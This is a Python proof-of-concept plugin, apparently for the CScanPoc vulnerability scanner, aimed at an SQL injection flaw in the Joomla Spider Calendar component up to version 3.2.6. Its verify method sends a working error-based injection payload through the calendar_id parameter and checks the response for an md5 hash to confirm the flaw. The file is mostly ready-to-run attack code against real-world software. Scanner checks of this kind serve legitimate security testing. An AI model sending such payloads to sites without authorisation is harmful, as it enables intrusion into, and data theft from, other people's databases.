# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0066'  # 平台漏洞编号
    name = 'Joomla Spider Calendar <= 3.2.6 SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-08-31'  # 漏洞公布时间
    desc = '''
        Joomla Spider Calendar Component SQL Injection in index.php, calendar_id param.
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-87242'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Joomla Spider Calendar <= 3.2.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9abdca8b-9924-4fc3-a52c-b6bf4f55b2f8'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '||exp(~(select*from(select md5(456546))a))'
            vul_url = arg + '/index.php?option=com_spidercalendar&view=spidercalendar&calendar_id=1'
            response = requests.get(vul_url+payload).text
            if 'e02f052b7d3db73f99d4f5801f2b6fff' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
